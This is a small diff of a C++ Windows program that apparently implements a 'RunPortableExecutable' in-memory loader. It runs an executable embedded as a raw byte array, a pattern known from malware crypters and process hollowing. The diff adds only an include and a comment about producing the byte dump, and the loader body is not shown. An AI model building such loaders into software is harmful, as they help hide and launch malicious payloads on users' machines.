@@ -1,7 +1,7 @@
 
 #include <iostream> // Standard C++ library for console I/O
 #include <string> // Standard C++ Library for string manip
-
+#include <fstream> 
 #include <Windows.h> // WinAPI Header
 #include <TlHelp32.h> //WinAPI Process API
 
@@ -94,6 +94,7 @@ int RunPortableExecutable(void* Image)
 }
 
 // enter valid bytes of a program here.
+//Using 010 Hex editor copy all as C hex works perfectly. A complete hexdump, no magic ;)
 unsigned char rawData[37376] = {
 	0x4D, 0x5A, 0x90, 0x00, 0x03, 0x00, 0x00, 0x00, 0x04, 0x00, 0x00, 0x00,
 	0xFF, 0xFF, 0x00, 0x00, 0xB8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
